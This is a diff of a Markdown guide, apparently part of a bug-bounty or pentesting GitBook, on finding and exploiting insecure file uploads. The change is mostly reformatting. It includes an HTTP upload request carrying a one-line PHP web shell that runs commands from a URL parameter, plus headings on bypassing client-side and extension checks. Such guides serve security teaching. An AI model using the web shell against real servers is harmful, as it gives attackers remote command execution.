@@ -15,38 +15,43 @@
 #### <sup>**V01.**</sup>**&#x20;Insecure file uploads: A complete guide to finding advanced file upload vulnerabilities:**
 
 1. **Identifying file upload vulnerabilities**
-   1. Retrievable
-   2. Content-Type
-2. **Exploiting simple file upload vulnerabilities**
-   1. No restrictions
+   * Retrievable
+   * Content-Type
+2.  **Exploiting simple file upload vulnerabilities**
 
-```http
-POST /Api/FileUpload.aspx HTTP/2
-Host: console.example.com
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.3
-Content-Type: multipart/form-data; boundary=----WebKitFormBoundary3RwPFJztxaJvrqAq
-Accept: */*
+    * No restrictions
 
-------WebKitFormBoundary3RwPFJztxaJvrqAq
-Content-Disposition: form-data; name="file"; filename="shell.php"
-Content-Type: application/x-php
+    ```http
+    POST /Api/FileUpload.aspx HTTP/2
+    Host: console.example.com
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.3
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundary3RwPFJztxaJvrqAq
+    Accept: */*
 
-<?php echo system($_GET['e']); ?>
-------WebKitFormBoundary3RwPFJztxaJvrqAq--
-```
+    ------WebKitFormBoundary3RwPFJztxaJvrqAq
+    Content-Disposition: form-data; name="file"; filename="shell.php"
+    Content-Type: application/x-php
 
-* Bypassing client-side restrictions
-  * HTML "accept" attribute
-  * using proxy interceptors
-* Bypassing a file extension blacklist
+    <?php echo system($_GET['e']); ?>
+    ------WebKitFormBoundary3RwPFJztxaJvrqAq--
+    ```
 
-<figure><img src=".gitbook/assets/file-upload-vuln1.png" alt=""><figcaption></figcaption></figure>
+    * Bypassing client-side restrictions
+      *   HTML "accept" attribute
 
-<p align="center">Bypass file extension exclusion lists</p>
+          ```html
+          <input type="file" accept=".jpg, .jpeg, .png, .gif" />
+          ```
+      * using proxy interceptors
+    * Bypassing a file extension blacklist
 
-* Bypassing a file extension whitelist
+    <figure><img src=".gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src=".gitbook/assets/file-upload-vuln2.png" alt=""><figcaption></figcaption></figure>
+    <p align="center">Bypass file extension exclusion lists</p>
+
+    * Bypassing a file extension whitelist
+
+
 
 <p align="center">Bypass file extension inclusion lists</p>
 
